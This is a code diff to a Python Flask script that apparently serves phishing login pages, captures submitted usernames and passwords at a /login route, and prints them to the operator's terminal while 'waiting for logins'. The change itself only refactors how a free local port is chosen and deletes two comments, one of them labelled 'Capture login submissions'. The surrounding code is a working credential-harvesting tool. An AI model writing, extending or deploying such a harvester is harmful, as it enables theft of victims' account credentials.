@@ -1,6 +1,7 @@
 import os
 import sys
 import logging
+import socket
 from flask import Flask, request, send_from_directory
 from datetime import datetime
 
@@ -49,13 +50,11 @@ selected_html = "1.html"  # default HTML file
 def home():
     return send_from_directory(".", selected_html)
 
-# ---- Capture login submissions ----
 @app.route('/login', methods=["POST"])
 def login():
     username = request.form.get("username")
     password = request.form.get("password")
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    # Old neat symbol box style
     print(f"""{pink}
 ╔══════════════════════════════╗
 ║ {cyan}Username: {ylo}{username}{cyan}            
@@ -65,18 +64,21 @@ def login():
 """)
     return "Login received! Check terminal."
 
+# -------- Find free port --------
+def get_free_port(start_port=8080):
+    port = start_port
+    while True:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            if s.connect_ex(('127.0.0.1', port)) != 0:
+                return port
+            port += 1
+
 # -------- Run Flask on available port --------
 def run_server():
-    port = 8080
-    while True:
-        try:
-            print(f"{grn}Server running at: {cyan}http://127.0.0.1:{port}{reset}\n")
-            print(f"{pink}Waiting for logins... Press Ctrl+C to stop.{reset}\n")
-            app.run(host="127.0.0.1", port=port, debug=False)
-            break
-        except OSError:
-            print(f"{ylo}Port {port} is in use, trying next port...{reset}")
-            port += 1
+    port = get_free_port(8080)
+    print(f"{grn}Server running at: {cyan}http://127.0.0.1:{port}{reset}\n")
+    print(f"{pink}Waiting for logins... Press Ctrl+C to stop.{reset}\n")
+    app.run(host="127.0.0.1", port=port, debug=False)
 
 if __name__ == "__main__":
     banner()
